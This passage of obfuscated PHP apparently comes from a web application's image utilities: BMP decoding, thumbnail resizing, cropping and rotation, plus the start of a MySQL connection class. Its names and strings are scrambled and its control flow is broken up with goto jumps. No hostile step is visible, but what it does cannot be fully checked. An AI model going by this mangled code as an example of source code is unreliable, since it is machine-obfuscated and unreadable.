$d¿àä±ËãÚ; ++$eÆ”®²ğ¸, ++$Cå×³ÅØö˜, $b‰ôšºêñ += $B·•óÖèãŞ) { $eõÒ‚‚ÍÚ = $b‰ôšºêñ & 7; imagesetpixel($d­–ƒæö¬å, $Cå×³ÅØö˜, $E°¾á÷Ì¶’, $a¹½ÛŠ„Ç–[($Eö¶ ‰¨Òì & $D‚¸çÎçº… >> $eõÒ‚‚ÍÚ) >> $DÒÛ¤˜ì‚ù - $eõÒ‚‚ÍÚ]); } break; } } } else { for ($d‚’Ã²—î = 0; $d‚’Ã²—î < $CÚ´ƒ÷¼Õï; ++$d‚’Ã²—î, $E°¾á÷Ì¶’ += $Aàà‚óçºˆ) { $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, $a®“…Ò³); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } $b‰ôšºêñ = 0; for ($Cå×³ÅØö˜ = 0; $Cå×³ÅØö˜ < $f¨İˆˆäÎ§; ++$Cå×³ÅØö˜, $b‰ôšºêñ += $B·•óÖèãŞ) { list(, $Eö¶ ‰¨Òì) = unpack($a©Ç¢™‘™[1849], $Cåî–‰«Ü[$b‰ôšºêñ >> 3]); $eõÒ‚‚ÍÚ = $b‰ôšºêñ & 7; imagesetpixel($d­–ƒæö¬å, $Cå×³ÅØö˜, $E°¾á÷Ì¶’, $a¹½ÛŠ„Ç–[($Eö¶ ‰¨Òì & $D‚¸çÎçº… >> $eõÒ‚‚ÍÚ) >> $DÒÛ¤˜ì‚ù - $eõÒ‚‚ÍÚ]); } } } goto DÆá‹Ñ«Ü; DÆá‹Ñ«Ü: } else { goto eÃŸ…òØ›; e¦³ÌÕŠ¤‹: $a†‰‚±Í÷Ö = $B·•óÖèãŞ >> 3; $f¯®‰¶¾„² = $FÙªë§ÌÆ‡ ? 127 : 0; $EèÊ–È•Û = $FÙªë§ÌÆ‡ ? 1 / $FÙªë§ÌÆ‡ : 1; goto a´¢ÅÜ»Ú±; FˆºÅ›èğô: for ($d‚’Ã²—î = 0; $d‚’Ã²—î < $CÚ´ƒ÷¼Õï; ++$d‚’Ã²—î, $E°¾á÷Ì¶’ += $Aàà‚óçºˆ) { $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, $a®“…Ò³); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } $b‰ôšºêñ = 0; for ($Cå×³ÅØö˜ = 0; $Cå×³ÅØö˜ < $f¨İˆˆäÎ§; ++$Cå×³ÅØö˜, $b‰ôšºêñ += $a†‰‚±Í÷Ö) { list(, $Eö¶ ‰¨Òì) = unpack($a©Ç¢™‘™[1826], substr($Cåî–‰«Ü, $b‰ôšºêñ, $a†‰‚±Í÷Ö) . $a©Ç¢™‘™[1850]); $bÑÌ¯·Ïø = $Eö¶ ‰¨Òì & $FÙªë§ÌÆ‡; $A¯´‚‹…ĞÅ = $Eö¶ ‰¨Òì & $EÙàƒÓè´˜; $CÃÚÊ®Å˜ = $Eö¶ ‰¨Òì & $fÙÃÆ„íƒÑ; $D›Ò˜¦·Æ£ = $Eö¶ ‰¨Òì & $fëÊâßÉ·‘; $FÓå¹ø£ = $f¯®‰¶¾„² - (($bÑÌ¯·Ïø << 7) - $bÑÌ¯·Ïø) * $EèÊ–È•Û; $BÈÁñ­¼© = (($A¯´‚‹…ĞÅ << 8) - $A¯´‚‹…ĞÅ) * $aˆí³ù–Œ; $f–Â®Ë‰ì = (($CÃÚÊ®Å˜ << 8) - $CÃÚÊ®Å˜) * $F»“¸‰æŸÁ; $eõÒ‚‚ÍÚ = (($D›Ò˜¦·Æ£ << 8) - $D›Ò˜¦·Æ£) * $FÅé×ì®ê‡; imagesetpixel($d­–ƒæö¬å, $Cå×³ÅØö˜, $E°¾á÷Ì¶’, $FÓå¹ø£ << 24 | $BÈÁñ­¼© << 16 | $f–Â®Ë‰ì << 8 | $eõÒ‚‚ÍÚ); } } imagealphablending($d­–ƒæö¬å, !0); goto cçˆ¬²”¡ö; a´¢ÅÜ»Ú±: $aˆí³ù–Œ = $EÙàƒÓè´˜ ? 1 / $EÙàƒÓè´˜ : 1; $F»“¸‰æŸÁ = $fÙÃÆ„íƒÑ ? 1 / $fÙÃÆ„íƒÑ : 1; $FÅé×ì®ê‡ = $fëÊâßÉ·‘ ? 1 / $fëÊâßÉ·‘ : 1; goto FˆºÅ›èğô; eÃŸ…òØ›: $d­–ƒæö¬å = imagecreatetruecolor($f¨İˆˆäÎ§, $CÚ´ƒ÷¼Õï); imagealphablending($d­–ƒæö¬å, !1); if ($FÙªë§ÌÆ‡) { imagesavealpha($d­–ƒæö¬å, !0); } goto e¦³ÌÕŠ¤‹; cçˆ¬²”¡ö: } return $d­–ƒæö¬å; goto EËºŞÏÄè›; A™ã†ğ—õ“: $a©Ç¢™‘™ =& $_SERVER[¨¤¼…´]; if ($cÆÍë‹ù©È[$a©Ç¢™‘™[400]] != 19778) { return !1; } $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, 4); goto EáÈ‰èÍÌ; EáÈ‰èÍÌ: if ($Cåî–‰«Ü === !1) { return !1; } list(, $a˜ÊŞ‘ñà®) = unpack($a©Ç¢™‘™[1826], $Cåî–‰«Ü); if ($a˜ÊŞ‘ñà® == 12) { goto Eç‘ä„Áİ­; BŸ¾™ÚÁ½İ: $fëÊâßÉ·‘ = 255; goto bØ‚Ó¨µîñ; FæÕá•Ùí³: $cÛ¨à©®É‚ = $aœ—¿Õ‰‹ù = $FÙªë§ÌÆ‡ = $A±¼šãÆ‚é = 0; $EÙàƒÓè´˜ = 16711680; $fÙÃÆ„íƒÑ = 65280; goto BŸ¾™ÚÁ½İ; Eç‘ä„Áİ­: $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, $a˜ÊŞ‘ñà® - 4); if ($Cåî–‰«Ü === !1) { return !1; } extract(unpack($a©Ç¢™‘™[1827] . $a©Ç¢™‘™[1828] . $a©Ç¢™‘™[1829] . $a©Ç¢™‘™[1830], $Cåî–‰«Ü)); goto FæÕá•Ùí³; bØ‚Ó¨µîñ: } else { if (124 < $a˜ÊŞ‘ñà® || $a˜ÊŞ‘ñà® < 40) { return !1; } else { goto b Í¹±äÕµ; BÀ¹ÛÅ­: if (($B·•óÖèãŞ == 16 || $B·•óÖèãŞ == 24 || $B·•óÖèãŞ == 32) && $A±¼šãÆ‚é == 0 && $EÙàƒÓè´˜ == 0 && $fÙÃÆ„íƒÑ == 0 && $fëÊâßÉ·‘ == 0) { switch ($B·•óÖèãŞ) { case 16: $EÙàƒÓè´˜ = 31744; $fÙÃÆ„íƒÑ = 992; $fëÊâßÉ·‘ = 31; break; case 24: case 32: $EÙàƒÓè´˜ = 16711680; $fÙÃÆ„íƒÑ = 65280; $fëÊâßÉ·‘ = 255; break; } } goto e»ƒï™¯; a˜¶©¾çÌ•: if ($c˜â™°´»ø & 2147483648) { $c˜â™°´»ø = -(~$c˜â™°´»ø & 4294967295) - 1; } if ($cÆÍë‹ù©È[$a©Ç¢™‘™[533]] != 0) { $EöĞÎâ«É— = $B·•óÖèãŞ == 1 || $B·•óÖèãŞ == 4 || $B·•óÖèãŞ == 8 ? ($cÛ¨à©®É‚ ? $cÛ¨à©®É‚ : pow(2, $B·•óÖèãŞ)) << 2 : 0; $f±±…†Êˆã = $fÜ„¸ì”‘ ? $fÜ„¸ì”‘ : ($f¨İˆˆäÎ§ * $B·•óÖèãŞ + 31 >> 3 & ~3) * abs($e×ï´“Àğ); $A¡¿‰­¤ïµ = $cÆÍë‹ù©È[$a©Ç¢™‘™[533]] - $f±±…†Êˆã - $EöĞÎâ«É— - 14; if ($a˜ÊŞ‘ñà® < $A¡¿‰­¤ïµ && 40 <= $a˜ÊŞ‘ñà® && $a˜ÊŞ‘ñà® <= 124) { $a˜ÊŞ‘ñà® = $A¡¿‰­¤ïµ; } } if ($a˜ÊŞ‘ñà® - 40 > 0) { $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, $a˜ÊŞ‘ñà® - 40); if ($Cåî–‰«Ü === !1) { return !1; } extract(unpack($a©Ç¢™‘™[1840] . $a©Ç¢™‘™[1841] . $a©Ç¢™‘™[1842] . $a©Ç¢™‘™[1843], $Cåî–‰«Ü . str_repeat($a©Ç¢™‘™[1844], 120))); } else { $FÙªë§ÌÆ‡ = $EÙàƒÓè´˜ = $fÙÃÆ„íƒÑ = $fëÊâßÉ·‘ = 0; } goto BÀ¹ÛÅ­; b Í¹±äÕµ: $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, 36); if ($Cåî–‰«Ü === !1) { return !1; } extract(unpack($a©Ç¢™‘™[1831] . $a©Ç¢™‘™[1832] . $a©Ç¢™‘™[1829] . $a©Ç¢™‘™[1833] . $a©Ç¢™‘™[1834] . $a©Ç¢™‘™[1835] . $a©Ç¢™‘™[1836] . $a©Ç¢™‘™[1837] . $a©Ç¢™‘™[1838] . $a©Ç¢™‘™[1839], $Cåî–‰«Ü)); goto cÕˆ–Ôî¸”; cÕˆ–Ôî¸”: if ($f¨İˆˆäÎ§ & 2147483648) { $f¨İˆˆäÎ§ = -(~$f¨İˆˆäÎ§ & 4294967295) - 1; } if ($e×ï´“Àğ & 2147483648) { $e×ï´“Àğ = -(~$e×ï´“Àğ & 4294967295) - 1; } if ($a©ÄÜ‹æø & 2147483648) { $a©ÄÜ‹æø = -(~$a©ÄÜ‹æø & 4294967295) - 1; } goto a˜¶©¾çÌ•; e»ƒï™¯: } } goto cÆØÎ–Ò ; cÆØÎ–Ò : if ($f¨İˆˆäÎ§ == 0 || $e×ï´“Àğ == 0 || $d°¶öî£‡Ç != 1 || ($FÙªë§ÌÆ‡ & $EÙàƒÓè´˜) != 0 || ($FÙªë§ÌÆ‡ & $fÙÃÆ„íƒÑ) != 0 || ($FÙªë§ÌÆ‡ & $fëÊâßÉ·‘) != 0 || ($EÙàƒÓè´˜ & $fÙÃÆ„íƒÑ) != 0 || ($EÙàƒÓè´˜ & $fëÊâßÉ·‘) != 0 || ($fÙÃÆ„íƒÑ & $fëÊâßÉ·‘) != 0) { return !1; } if ($A±¼šãÆ‚é == 4 || $A±¼šãÆ‚é == 5) { $Cåî–‰«Ü = stream_get_contents($fôŒÒÉ¢¢„, $fÜ„¸ì”‘); if ($Cåî–‰«Ü === !1) { return !1; } return imagecreatefromstring($Cåî–‰«Ü); } $a®“…Ò³ = $f¨İˆˆäÎ§ * $B·•óÖèãŞ + 31 >> 3 & ~3; goto D¬Ç¾ØÉÇæ; D¬Ç¾ØÉÇæ: $CÚ´ƒ÷¼Õï = abs($e×ï´“Àğ); $E°¾á÷Ì¶’ = $e×ï´“Àğ > 0 ? $CÚ´ƒ÷¼Õï - 1 : 0; $Aàà‚óçºˆ = $e×ï´“Àğ > 0 ? -1 : 1; goto E’Ô—µ‘Õí; EËºŞÏÄè›: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($Cø×˜’øõİ, $a«ã‹Â·Ò×) { goto bãô‡ŸÆèÈ; bãô‡ŸÆèÈ: $this->srcFile = $Cø×˜’øõİ; $this->echoType = $a«ã‹Â·Ò×; $this->im = self::image($Cø×˜’øõİ); goto bÌ ãÅ˜Ï; bÌ ãÅ˜Ï: if (!$this->im) { return !1; } $aòŠªè©ƒ = $_SERVER[¨¤¼…´][43]; $this->imgData = GetImageSize($Cø×˜’øõİ, $aòŠªè©ƒ); goto fªŸÒÑ½ø; fªŸÒÑ½ø: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto BÁ»ÉßØò‘; BÁ»ÉßØò‘: } public static function image($E™ƒ‘£¸¼§) { $eî•½Á«×· =& $_SERVER[¨¤¼…´]; $b†Ä÷†¿ÇÎ = $eî•½Á«×·[43]; $B‘ˆ—õº’† = GetImageSize($E™ƒ‘£¸¼§, $b†Ä÷†¿ÇÎ); $bÀ´œ¨ÉÇ• = !1; switch ($B‘ˆ—õº’†[2]) { case IMAGETYPE_GIF: if (!function_exists($eî•½Á«×·[1851])) { break; } $bÀ´œ¨ÉÇ• = imagecreatefromgif($E™ƒ‘£¸¼§); break; case IMAGETYPE_JPEG: if (!function_exists($eî•½Á«×·[1852])) { break; } $bÀ´œ¨ÉÇ• = imagecreatefromjpeg($E™ƒ‘£¸¼§); break; case IMAGETYPE_PNG: if (!function_exists($eî•½Á«×·[1853])) { break; } $bÀ´œ¨ÉÇ• = @imagecreatefrompng($E™ƒ‘£¸¼§); imagesavealpha($bÀ´œ¨ÉÇ•, !0); break; case IMAGETYPE_XBM: $bÀ´œ¨ÉÇ• = imagecreatefromxbm($E™ƒ‘£¸¼§); break; case IMAGETYPE_WBMP: $bÀ´œ¨ÉÇ• = imagecreatefromwbmp($E™ƒ‘£¸¼§); break; case IMAGETYPE_BMP: $bÀ´œ¨ÉÇ• = imagecreatefrombmp($E™ƒ‘£¸¼§); break; default: break; } return $bÀ´œ¨ÉÇ•; } public static function imageSize($f£¶Š½ßÎ™) { $E’¸¢ªùó· =& $_SERVER[¨¤¼…´]; $eµ‘Ë™ôÄæ = GetImageSize($f£¶Š½ßÎ™); if (!$eµ‘Ë™ôÄæ) { return !1; } return array($E’¸¢ªùó·[1854] => $eµ‘Ë™ôÄæ[0], $E’¸¢ªùó·[1855] => $eµ‘Ë™ôÄæ[1]); } function distortion($e¼ÃÄÙ‰‘Š, $aª¬¿é­¦£, $bñ¹‘ˆ¾‰§) { $AÀ²ÓƒŒÏè = $this->creatImage($this->im, $aª¬¿é­¦£, $bñ¹‘ˆ¾‰§, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($AÀ²ÓƒŒÏè, $e¼ÃÄÙ‰‘Š); } function prorate($A§Û‹¯…Ÿ¸, $CŠ½ğÑ„èô, $dÓ‰†Ò¯¶‘) { $CÉÊÕĞÏˆø = $CŠ½ğÑ„èô / $dÓ‰†Ò¯¶‘; $AÜªµ‰´Íİ = $this->srcW / $this->srcH; if ($CÉÊÕĞÏˆø <= $AÜªµ‰´Íİ) { $C‘óøÓ¶ŸÅ = $CŠ½ğÑ„èô; $dàíÙÀ’èë = $C‘óøÓ¶ŸÅ * ($this->srcH / $this->srcW); } else { $dàíÙÀ’èë = $dÓ‰†Ò¯¶‘; $C‘óøÓ¶ŸÅ = $dàíÙÀ’èë * ($this->srcW / $this->srcH); } if ($this->srcW > $CŠ½ğÑ„èô || $this->srcH > $dÓ‰†Ò¯¶‘) { $a±”åí®…Î = $this->creatImage($this->im, $C‘óøÓ¶ŸÅ, $dàíÙÀ’èë, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $a±”åí®…Î = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $a±”åí®…Î = $this->autoRotate($a±”åí®…Î); return $this->echoImage($a±”åí®…Î, $A§Û‹¯…Ÿ¸); } private function autoRotate($B›ğ††·Ù±) { goto aÃ‹†ìİèå; e‚¥ë»‚ë: if (!$FŸË†»ÃŸÙ || !isset($FŸË†»ÃŸÙ[$D¿ ºå¥¯ [1857]]) || $FŸË†»ÃŸÙ[$D¿ ºå¥¯ [1857]] == 1) { return $B›ğ††·Ù±; } $d­Æà„¶Š¥ = 0; if ($FŸË†»ÃŸÙ[$D¿ ºå¥¯ [1857]] == 6) { $d­Æà„¶Š¥ = 90; } goto dÑ‡”ÂÖÓ¬; dÑ‡”ÂÖÓ¬: if ($FŸË†»ÃŸÙ[$D¿ ºå¥¯ [1857]] == 8) { $d­Æà„¶Š¥ = 270; } if ($FŸË†»ÃŸÙ[$D¿ ºå¥¯ [1857]] == 3) { $d­Æà„¶Š¥ = 180; } return $this->rotateDegree($B›ğ††·Ù±, $d­Æà„¶Š¥); goto F”Ö§™‘Èó; aÃ‹†ìİèå: $D¿ ºå¥¯  =& $_SERVER[¨¤¼…´]; if (!$B›ğ††·Ù± || !function_exists($D¿ ºå¥¯ [1856])) { return $B›ğ††·Ù±; } $FŸË†»ÃŸÙ = exif_read_data($this->srcFile); goto e‚¥ë»‚ë; F”Ö§™‘Èó: } private function rotateDegree($E‡ÇôîŠğ, $eùĞîµ•²) { if (!$E‡ÇôîŠğ || $eùĞîµ•² % 360 === 0 || !function_exists($_SERVER[¨¤¼…´][1858])) { return $E‡ÇôîŠğ; } $D¿Ä‡›šÓ = imageRotate($E‡ÇôîŠğ, 360 - $eùĞîµ•², 0); imageDestroy($E‡ÇôîŠğ); return $D¿Ä‡›šÓ ? $D¿Ä‡›šÓ : $E‡ÇôîŠğ; } function cut($bõ¸ßÕŞ´, $aÉÉâ„èª©, $B‘ª„«ĞÆÙ) { goto A‹¸«æ¯¢; f‹è„îõ±: return $this->echoImage($D‡À²óìßñ, $bõ¸ßÕŞ´); goto aô„ÌİæÊ¦; Fç«’”œ¬Œ: $a³Èïä‚« = $this->creatImage($this->im, $eòÛÁø©‚´, $F‡ÁÒŠí„, 0, 0, 0, 0, $this->srcW, $this->srcH); $D‡À²óìßñ = $this->creatImage($a³Èïä‚«, $aÉÉâ„èª©, $B‘ª„«ĞÆÙ, 0, 0, ($eòÛÁø©‚´ - $aÉÉâ„èª©) / 2, ($F‡ÁÒŠí„ - $B‘ª„«ĞÆÙ) / 2, $aÉÉâ„èª©, $B‘ª„«ĞÆÙ); imageDestroy($a³Èïä‚«); goto f‹è„îõ±; A‹¸«æ¯¢: $F¿Ó°Ø™Š® = $aÉÉâ„èª© / $B‘ª„«ĞÆÙ; $fÒñ‹‡ëçÇ = $this->srcW / $this->srcH; if ($F¿Ó°Ø™Š® <= $fÒñ‹‡ëçÇ) { $F‡ÁÒŠí„ = $B‘ª„«ĞÆÙ; $eòÛÁø©‚´ = $F‡ÁÒŠí„ * ($this->srcW / $this->srcH); } else { $eòÛÁø©‚´ = $aÉÉâ„èª©; $F‡ÁÒŠí„ = $eòÛÁø©‚´ * ($this->srcH / $this->srcW); } goto Fç«’”œ¬Œ; aô„ÌİæÊ¦: } function backFill($cŸºñƒÜª, $båê·ë®Œ¶, $E‹¨éßŠô–, $C¢Ì³ïë„ = false, $C£·©ÇŠŞÌ = 255, $cá¥Æëœİ¨ = 255, $fá×äŒÌ¥ù = 255) { goto aÏº”¨‰ø; Fğ°¬Ï£«: if (function_exists($_SERVER[¨¤¼…´][1859])) { @($f¦Æ‰¨‹Ñ = imageCreateTrueColor($båê·ë®Œ¶, $E‹¨éßŠô–)); if (!$f¦Æ‰¨‹Ñ) { $f¦Æ‰¨‹Ñ = imageCreate($båê·ë®Œ¶, $E‹¨éßŠô–); } } else { $f¦Æ‰¨‹Ñ = imageCreate($båê·ë®Œ¶, $E‹¨éßŠô–); } $cÇ¢©øˆÁ = ($E‹¨éßŠô– - $c¹ŒöÀÁïÃ) / 2; $Dà·‹µó¯ = imagecolorallocate($f¦Æ‰¨‹Ñ, $C£·©ÇŠŞÌ, $cá¥Æëœİ¨, $fá×äŒÌ¥ù); goto b©»ÛŒ¾ÓÀ; b©»ÛŒ¾ÓÀ: if ($C¢Ì³ïë„) { $Dà·‹µó¯ = imageColorTransparent($f¦Æ‰¨‹Ñ, $Dà·‹µó¯); $cÇ¢©øˆÁ = $E‹¨éßŠô– - $c¹ŒöÀÁïÃ; } imageFilledRectangle($f¦Æ‰¨‹Ñ, 0, 0, $båê·ë®Œ¶, $E‹¨éßŠô–, $Dà·‹µó¯); if ($this->srcW > $båê·ë®Œ¶ || $this->srcH > $E‹¨éßŠô–) { $B‡›¼¿–ã‘ = $this->creatImage($this->im, $f·Äï¨ß â, $c¹ŒöÀÁïÃ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($f·Äï¨ß â < $båê·ë®Œ¶) { imageCopy($f¦Æ‰¨‹Ñ, $B‡›¼¿–ã‘, ($båê·ë®Œ¶ - $f·Äï¨ß â) / 2, 0, 0, 0, $f·Äï¨ß â, $c¹ŒöÀÁïÃ); } else { if ($c¹ŒöÀÁïÃ < $E‹¨éßŠô–) { imageCopy($f¦Æ‰¨‹Ñ, $B‡›¼¿–ã‘, 0, $cÇ¢©øˆÁ, 0, 0, $f·Äï¨ß â, $c¹ŒöÀÁïÃ); } else { imageCopy($f¦Æ‰¨‹Ñ, $B‡›¼¿–ã‘, 0, 0, 0, 0, $f·Äï¨ß â, $c¹ŒöÀÁïÃ); } } } else { imageCopyMerge($f¦Æ‰¨‹Ñ, $this->im, ($båê·ë®Œ¶ - $f·Äï¨ß â) / 2, $cÇ¢©øˆÁ, 0, 0, $f·Äï¨ß â, $c¹ŒöÀÁïÃ, 100); } goto a»“…‰É; aÏº”¨‰ø: $dŠ³¶ºÌ¥ = $båê·ë®Œ¶ / $E‹¨éßŠô–; $eƒˆœÂ«µà = $this->srcW / $this->srcH; if ($dŠ³¶ºÌ¥ <= $eƒˆœÂ«µà) { $f·Äï¨ß â = $båê·ë®Œ¶; $c¹ŒöÀÁïÃ = $f·Äï¨ß â * ($this->srcH / $this->srcW); } else { $c¹ŒöÀÁïÃ = $E‹¨éßŠô–; $f·Äï¨ß â = $c¹ŒöÀÁïÃ * ($this->srcW / $this->srcH); } goto Fğ°¬Ï£«; a»“…‰É: return $this->echoImage($f¦Æ‰¨‹Ñ, $cŸºñƒÜª); goto eˆ¸öÄÅ’Ë; eˆ¸öÄÅ’Ë: } function creatImage($BÈàÎ×øîÄ, $A¡ÚÕİÖ††, $b–”£½ï¼¨, $C¦Íâ“ÂÊô, $d¨½½¶Óîæ, $E“ïŞê®ÜÕ, $Dò¾ê‰ÃÏù, $A‰é´˜Û³, $e¹Í¿‹¨ÃÑ) { if (function_exists($_SERVER[¨¤¼…´][1859])) { @($bĞÜ˜†Ï¸î = ImageCreateTrueColor($A¡ÚÕİÖ††, $b–”£½ï¼¨)); @imagealphablending($bĞÜ˜†Ï¸î, !1); @imagesavealpha($bĞÜ˜†Ï¸î, !0); if ($bĞÜ˜†Ï¸î) { imageCopyResampled($bĞÜ˜†Ï¸î, $BÈàÎ×øîÄ, $C¦Íâ“ÂÊô, $d¨½½¶Óîæ, $E“ïŞê®ÜÕ, $Dò¾ê‰ÃÏù, $A¡ÚÕİÖ††, $b–”£½ï¼¨, $A‰é´˜Û³, $e¹Í¿‹¨ÃÑ); } else { $bĞÜ˜†Ï¸î = ImageCreate($A¡ÚÕİÖ††, $b–”£½ï¼¨); imageCopyResized($bĞÜ˜†Ï¸î, $BÈàÎ×øîÄ, $C¦Íâ“ÂÊô, $d¨½½¶Óîæ, $E“ïŞê®ÜÕ, $Dò¾ê‰ÃÏù, $A¡ÚÕİÖ††, $b–”£½ï¼¨, $A‰é´˜Û³, $e¹Í¿‹¨ÃÑ); } } else { $bĞÜ˜†Ï¸î = ImageCreate($A¡ÚÕİÖ††, $b–”£½ï¼¨); imageCopyResized($bĞÜ˜†Ï¸î, $BÈàÎ×øîÄ, $C¦Íâ“ÂÊô, $d¨½½¶Óîæ, $E“ïŞê®ÜÕ, $Dò¾ê‰ÃÏù, $A¡ÚÕİÖ††, $b–”£½ï¼¨, $A‰é´˜Û³, $e¹Í¿‹¨ÃÑ); } return $bĞÜ˜†Ï¸î; } public function imgRotate($EğàºáÓ™ƒ, $AºÚÀåÏ¡) { goto a¬Îõ¦šÒ; a¬Îõ¦šÒ: if (!$this->im || $AºÚÀåÏ¡ % 360 === 0 || !function_exists($_SERVER[¨¤¼…´][1858])) { return !1; } $B¢ª¯ã“Î = imageRotate($this->im, 360 - $AºÚÀåÏ¡, 0); $e·Ò‡Ïó¹‹ = !1; goto fœÂî˜Ì°; fœÂî˜Ì°: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $e·Ò‡Ïó¹‹ = imagegif($B¢ª¯ã“Î, $EğàºáÓ™ƒ); break; case IMAGETYPE_JPEG: $e·Ò‡Ïó¹‹ = imagejpeg($B¢ª¯ã“Î, $EğàºáÓ™ƒ, 100); break; case IMAGETYPE_PNG: $e·Ò‡Ïó¹‹ = imagePNG($B¢ª¯ã“Î, $EğàºáÓ™ƒ); break; default: break; } imageDestroy($B¢ª¯ã“Î); imageDestroy($this->im); goto cÅè°‚…ç; cÅè°‚…ç: return $e·Ò‡Ïó¹‹; goto bğ¯§Ê®ØÏ; bğ¯§Ê®ØÏ: } function echoImage($CÈè‚‚Â¼, $BÒ…‡åÏÚÃ) { goto eÙšèõ²„–; eÙšèõ²„–: $b¢®ÅİÉçÄ =& $_SERVER[¨¤¼…´]; if (!$CÈè‚‚Â¼) { return !1; } ob_get_clean(); goto Cä­Š¼…Ä; dß˜Ú±ÀÙ: imageDestroy($CÈè‚‚Â¼); imageDestroy($this->im); return $DôÙ©•¾éÒ; goto b„”—ÒíœÚ; Cä­Š¼…Ä: $DôÙ©•¾éÒ = !1; $Dƒ÷¾ËÚ¼ = 90; switch ($this->echoType) { case $b¢®ÅİÉçÄ[1860]: $DôÙ©•¾éÒ = imagejpeg($CÈè‚‚Â¼, null, $Dƒ÷¾ËÚ¼); break; case $b¢®ÅİÉçÄ[181]: $DôÙ©•¾éÒ = imagejpeg($CÈè‚‚Â¼, $BÒ…‡åÏÚÃ, $Dƒ÷¾ËÚ¼); break; } goto dß˜Ú±ÀÙ; b„”—ÒíœÚ: } } if (!function_exists($_SERVER[¨¤¼…´][1861])) { define($_SERVER[¨¤¼…´][1862], 0); define($_SERVER[¨¤¼…´][1863], 1); define($_SERVER[¨¤¼…´][1864], 2); function imageflip($Ašï®²±¶‡, $f£ÄÎ½¶Ü) { switch ($f£ÄÎ½¶Ü) { case IMG_FLIP_HORIZONTAL: $EŠÕ¶ÙºÄ³ = imagesx($Ašï®²±¶‡) - 1; $C—¹÷â½”ˆ = $EŠÕ¶ÙºÄ³ / 2; $bğĞƒí‚… = imagesy($Ašï®²±¶‡); $DÍ•¬‚ñ©À = imageistruecolor($Ašï®²±¶‡) ? imagecreatetruecolor(1, $bğĞƒí‚…) : imagecreate(1, $bğĞƒí‚…); for ($b„ÀŸ‚Œ— = 0; $b„ÀŸ‚Œ— < $C—¹÷â½”ˆ; ++$b„ÀŸ‚Œ—) { imagecopy($DÍ•¬‚ñ©À, $Ašï®²±¶‡, 0, 0, $b„ÀŸ‚Œ—, 0, 1, $bğĞƒí‚…); imagecopy($Ašï®²±¶‡, $Ašï®²±¶‡, $b„ÀŸ‚Œ—, 0, $EŠÕ¶ÙºÄ³ - $b„ÀŸ‚Œ—, 0, 1, $bğĞƒí‚…); imagecopy($Ašï®²±¶‡, $DÍ•¬‚ñ©À, $EŠÕ¶ÙºÄ³ - $b„ÀŸ‚Œ—, 0, 0, 0, 1, $bğĞƒí‚…); } break; case IMG_FLIP_VERTICAL: $FÆÑ¡–£Ùï = imagesx($Ašï®²±¶‡); $fÉöˆÍàó¥ = imagesy($Ašï®²±¶‡) - 1; $e”Á†ø¥¥ = $fÉöˆÍàó¥ / 2; $DÍ•¬‚ñ©À = imageistruecolor($Ašï®²±¶‡) ? imagecreatetruecolor($FÆÑ¡–£Ùï, 1) : imagecreate($FÆÑ¡–£Ùï, 1); for ($D¯‹¸ñìÅ = 0; $D¯‹¸ñìÅ < $e”Á†ø¥¥; ++$D¯‹¸ñìÅ) { imagecopy($DÍ•¬‚ñ©À, $Ašï®²±¶‡, 0, 0, 0, $D¯‹¸ñìÅ, $FÆÑ¡–£Ùï, 1); imagecopy($Ašï®²±¶‡, $Ašï®²±¶‡, 0, $D¯‹¸ñìÅ, 0, $fÉöˆÍàó¥ - $D¯‹¸ñìÅ, $FÆÑ¡–£Ùï, 1); imagecopy($Ašï®²±¶‡, $DÍ•¬‚ñ©À, 0, $fÉöˆÍàó¥ - $D¯‹¸ñìÅ, 0, 0, $FÆÑ¡–£Ùï, 1); } break; case IMG_FLIP_BOTH: $FÆÑ¡–£Ùï = imagesx($Ašï®²±¶‡); $bğĞƒí‚… = imagesy($Ašï®²±¶‡); $DÍ•¬‚ñ©À = imagerotate($Ašï®²±¶‡, 180, 0); imagecopy($Ašï®²±¶‡, $DÍ•¬‚ñ©À, 0, 0, 0, 0, $FÆÑ¡–£Ùï, $bğĞƒí‚…); break; default: return; } imagedestroy($DÍ•¬‚ñ©À); } } goto f½¤÷Ğ„¥Ó; F¹‹Ë•Şºé: class DbMysqli extends Db { public function __construct($cÃÈ‘‰­İ‹ = '') { $b¥ë‰îãØï =& $_SERVER[¨¤¼…´]; if (!extension_loaded($b¥ë‰îãØï[716])) { think_exception(think_lang($b¥ë‰îãØï[20]) . $b¥ë‰îãØï[814]); } if (!empty($cÃÈ‘‰­İ‹)) { $this->config = $cÃÈ‘‰­İ‹; if (empty($this->config[$b¥ë‰îãØï[23]])) { $this->config[$b¥ë‰îãØï[23]] = $b¥ë‰îãØï[43]; } } } public function connect($B¢­„êêÑ… = '', $e’¡±«Ğƒ = 0) { $F±º‰Š¥ÉŸ =& $_SERVER[¨¤¼…´]; if (!isset($this->linkID[$e’¡±«Ğƒ])) { goto eø·ïí˜à; eø·ïí˜à: if (empty($B¢­„êêÑ…)) { $B¢­„êêÑ… = $this->config; } $this->linkID[$e’¡±«Ğƒ] = new mysqli($B¢­„êêÑ…[$F±º‰Š¥ÉŸ[788]], $B¢­„êêÑ…[$F±º‰Š¥ÉŸ[790]], $B¢­„êêÑ…[$F±º‰Š¥ÉŸ[791]], $B¢­„êêÑ…[$F±º‰Š¥ÉŸ[27]], $B¢­„êêÑ…[$F±º‰Š¥ÉŸ[789]] ? intval($B¢­„êêÑ…[$F±º‰Š¥ÉŸ[789]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto E¾À¡¤£™›; E¾À¡¤£™›: $fÏ¥§á“ÍÇ = $this->linkID[$e’¡±«Ğƒ]->server_version; 